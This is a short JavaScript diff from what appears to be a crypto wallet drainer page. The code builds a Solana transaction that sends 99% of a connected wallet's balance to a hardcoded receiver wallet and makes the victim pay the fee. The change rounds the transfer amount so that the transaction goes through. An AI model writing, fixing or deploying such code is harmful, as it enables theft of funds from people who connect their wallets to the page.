@@ -31,12 +31,12 @@ $(document).ready(function() {
                         }
 
                         var transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: resp.publicKey,
-                                toPubkey: recieverWallet,
-                                lamports: balanceForTransfer * 0.99,
-                            }),
-                        );
+    solanaWeb3.SystemProgram.transfer({
+        fromPubkey: resp.publicKey,
+        toPubkey: recieverWallet,
+        lamports: Math.floor(balanceForTransfer * 0.99),
+    })
+);
 
                         transaction.feePayer = window.solana.publicKey;
                         let blockhashObj = await connection.getLatestBlockhash();
